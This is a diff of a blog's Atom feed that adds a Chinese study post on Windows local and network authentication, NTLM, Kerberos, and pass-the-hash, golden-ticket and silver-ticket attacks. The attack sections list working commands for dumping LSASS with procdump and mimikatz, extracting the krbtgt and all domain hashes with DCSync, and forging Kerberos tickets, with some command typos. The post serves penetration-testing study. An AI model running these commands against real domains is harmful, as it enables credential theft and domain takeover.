@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-06-14T05:25:48.106Z</updated>
+    <updated>2020-06-17T07:01:29.760Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,214 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[Windows认证&Kerberos&常见攻击]]></title>
+        <id>https://chriskalix.github.io/post/SXS4qCdRk/</id>
+        <link href="https://chriskalix.github.io/post/SXS4qCdRk/">
+        </link>
+        <updated>2020-06-17T06:58:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="1-windows本地认证">1. Windows本地认证</h2>
+<ul>
+<li>路径：<code>%SystemRoot%\system32\config\sam</code></li>
+<li>当我们登录系统的时候，系统会自动读取SAM文件中的&quot;密码&quot;与输入密码进行对比</li>
+</ul>
+<h3 id="ntlm-hash-nt-lan-manager"><strong>NTLM Hash</strong> (NT LAN Manager)</h3>
+<ul>
+<li>NTLM Hash是支持Net NTLM认证协议以及本地认证过程中的一个重要参与物，长度为32，由数字与字母组成。</li>
+<li>Windows本身不存储用户明文密码，它会将用户的明文经过加密算法后存储在SAM数据库中</li>
+<li>当用户登录时，明文也会加密成NTLM Hash，与SAM密码进行对比。NTLM Hash的前身是LM Hash，目前基本淘汰了（<strong>Windows Server 2008以前的系统还会用</strong>），但是依然存在</li>
+</ul>
+<p>NTLM Hash的产生：<br>
+<code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
+<p>LM Hash的产生：<br>
+小写转大写 -&gt; 转化为16进制分成2组，填充为14个字符 -&gt; 分成两组7字节的块 -&gt; 每组转化为比特流，不足56Bit在左边加0 -&gt; 将比特流按7比特一组，分出8组，末尾加0</p>
+<h3 id="本地认证流程图">本地认证流程图</h3>
+<img src="D:\个人学习\内网渗透\知识整理\imgs\windows本地认证流程.png" alt="image text" style="zoom: 33%;" />
+<h2 id="2-windows网络认证">2. Windows网络认证</h2>
+<p>常见服务： SMB服务（端口445）</p>
+<h3 id="ntlm协议">NTLM协议</h3>
+<blockquote>
+<p>早期SMB协议明文传输。后来出现LM协议（Challenge/Response机制），到后来的NTLM机制，现在以及更新了NTLMv2以及Kerberos(域环境下)验证体系</p>
+</blockquote>
+<h4 id="挑战响应机制">挑战/响应机制</h4>
+<ol>
+<li>协商（确认协议版本）</li>
+<li>质询
+<ul>
+<li>客户端向服务器端发送用户信息（用户名）请求</li>
+<li>服务器接受到请求，生成一个16位的随机数，被称为&quot;Challenge&quot;，使用用户名对应的NTLM Hash机密Challenge（16位随机字符），生成Chanllenge1。同时，生成Challenge1后，将Challenge1发送给客户端。 // Net NTLM Hash = NTLM Hash(Challenge)</li>
+<li>客户端接受到Chanllege后，同样的方式进行加密，返回Response</li>
+<li>服务器端进行对比认证</li>
+</ul>
+</li>
+</ol>
+<p>流程图：<br>
+<img src="D:\个人学习\内网渗透\知识整理\imgs\Challenge-Response.png" alt="image text" style="zoom: 33%;" /></p>
+<h3 id="ntlm-v2协议">NTLM v2协议</h3>
+<p>区别点：</p>
+<ul>
+<li>NTLM v1和v2的区别就是Changllenge与加密算法不同，但用的都是NTLM Hash作为原料</li>
+<li>v1的Challenge 8位，v2为16位</li>
+<li>v1加密算法是Des，v2是HMAC-MD5</li>
+</ul>
+<p><strong>工具</strong>：<br>
+Responder | smbexec | Inveigh</p>
+<h2 id="3-pthpass-the-hash哈希传递">3. <strong>PTH</strong>(Pass the hash)哈希传递</h2>
+<blockquote>
+<p>内网渗透中，经常需要抓取管理员密码，NTLM Hash，尤其是在域环境下，能帮助我们扩大战果</p>
+</blockquote>
+<ul>
+<li>什么是PTH<br>
+是一个不需要账户明文密码就能完成认证的一个技术</li>
+<li>作用<br>
+获取不到密码，破解不了NTLM Hash又想要扩大战果的问题</li>
+</ul>
+<h3 id="必要条件">必要条件</h3>
+<ol>
+<li>网络互达</li>
+<li>需要用户名</li>
+<li>需要NTLM Hash</li>
+</ol>
+<p>问：为什么需要用户名?<br>
+答：NTLM协议需要用户名，服务端需要用户名然后去读取</p>
+<h3 id="工具">工具</h3>
+<p>Smbmap | CrackMapExec |  Smbexec | Metasploit</p>
+<h3 id="相关问题">相关问题</h3>
+<p>如何使用 NTLMv1/v2（或者不常用的netNTLM）哈希进行传递哈希攻击？ @leesoh 坑人的问题，这些哈希都不能传递:&gt;</p>
+<h3 id="对应pth的手法问题">对应PTH的手法&amp;问题</h3>
+<p>对应手法：<br>
+LAPS<br>
+kb2871997：<br>
+内容 : 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享<br>
+这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接</p>
+<h2 id="4-kerberos认证机制非常重点">4. <strong>Kerberos认证机制</strong>(非常重点)</h2>
+<blockquote>
+<p>Kerberos是一种网络认证协议，不基于主机安全</p>
+</blockquote>
+<h3 id="域认证所有角色">域认证所有角色</h3>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC(Key Distribution Centor) = DC</li>
+</ul>
+<h3 id="详细流程图">详细流程图</h3>
+<img src="D:\个人学习\内网渗透\知识整理\imgs\Kerberos.png" alt="image text" style="zoom:80%;" />
+<h2 id="5-pttpass-the-ticket攻击">5. PTT(Pass The Ticket)攻击</h2>
+<blockquote>
+<p>在了解完上述Kerberos后，这边自然地引申出PTT攻击（票据传递攻击）</p>
+</blockquote>
+<h3 id="golden-ticket-黄金票据">Golden Ticket (黄金票据)</h3>
+<blockquote>
+<p>该票据的利用条件是原先已成功取得域用户的HASH，尤其是krbtgt这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
+</blockquote>
+<p>利用krbtgt的HASH值可以伪造生成任意的TGT,能够绕过对任意用户的账号策略，能够让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
+<h4 id="前提条件">前提条件</h4>
+<pre><code>域名称
+域SID
+域krbtgt的hash（意味着你已经有域控权限）
+伪造的用户名（任意用户或者不存在的用户）
+</code></pre>
+<h4 id="操作步骤">操作步骤</h4>
+<blockquote>
+<p>使用工具<code>mimikatz</code>(落地有杀软的话基本是杀的死死的，需要找个免杀版本)</p>
+</blockquote>
+<pre><code class="language-txt">还看到了用procdump.exe的，拖完拉到本地做
+procdump64.exe -accepteula -ma lsass.exe 存放路径\文件名
+mimikatz # sekurlsa::minidump 文件名
+mimikatz # sekurlsa::logonPasswords full
+</code></pre>
+<ol>
+<li>提取域用户krbtgt的NTLM Hash<br>
+<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code></li>
+<li>查看域内所有用户的hash<br>
+<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></li>
+<li>获取域sid<br>
+<code>whoami /all</code></li>
+<li>生成黄金票据<br>
+方法一：用AES256生成<br>
+<code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
+方法二：用NTLM Hash<br>
+<code>kerber::golden /domain:{域名称} /sid:{sid} krbtgt:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></li>
+</ol>
+<h3 id="sliver-ticket白银票据">Sliver Ticket(白银票据)</h3>
+<blockquote>
+<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信。这篇<a href="https://www.cnblogs.com/backlion/p/8119013.html">文章</a>挺好的</p>
+</blockquote>
+<h4 id="白银票据特点">白银票据特点</h4>
+<ol>
+<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名</li>
+<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>
+<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
+<li>攻击者需要服务帐户密码哈希值</li>
+<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li>
+<li>任何事件日志都在目标服务器上</li>
+</ol>
+<h4 id="前提条件-2">前提条件</h4>
+<pre><code>域名称
+域的SID
+域中Server服务器账户的NTLM-Hash
+伪造任意的用户名
+</code></pre>
+<h4 id="操作步骤-2">操作步骤</h4>
+<blockquote>
+<p>同样的，老朋友Mimiktaz了</p>
+</blockquote>
+<ol>
+<li>导出hash<br>
+mimikatz  log  &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</li>
+<li>为CIFS服务伪造Sliver Ticket<pre><code>kerberos::purge  清除票据
+kerberos::golden /domain:域名 /sid:SID /target:域全称 /service:要访问的服务  /rc4:NTLM  /user:username /ptt
+1. /domain：域名
+2. /sid：SID值
+3. /target: 域控制器全称
+4. /service: 需要指定相关的服务名，此处为cifs
+5. /rc4: 域控的计算机账户ntlm hash
+6. /user: 要伪造的用户名，任意填写
+为cifs服务创建白银票据，用于访问目标计算机上的任何共享。
+Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大
+</code></pre>
+还有一些其他的服务</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">服务名称</th>
+<th style="text-align:center">需要的服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">WMI</td>
+<td style="text-align:center">HOST、RPCSS</td>
+</tr>
+<tr>
+<td style="text-align:center">PowerShell Remoting</td>
+<td style="text-align:center">HOST、HTTP</td>
+</tr>
+<tr>
+<td style="text-align:center">WinRM</td>
+<td style="text-align:center">HOST、HTTP</td>
+</tr>
+<tr>
+<td style="text-align:center">Scheduled Tasks</td>
+<td style="text-align:center">HOST</td>
+</tr>
+<tr>
+<td style="text-align:center">Windows File Share</td>
+<td style="text-align:center">CIFS</td>
+</tr>
+<tr>
+<td style="text-align:center">LDAP</td>
+<td style="text-align:center">LDAP</td>
+</tr>
+<tr>
+<td style="text-align:center">Windows Remote Server</td>
+<td style="text-align:center">RPCSS、LDAP、CIFS</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Pbootcms v2.0.7 Getshell分析]]></title>
         <id>https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/</id>
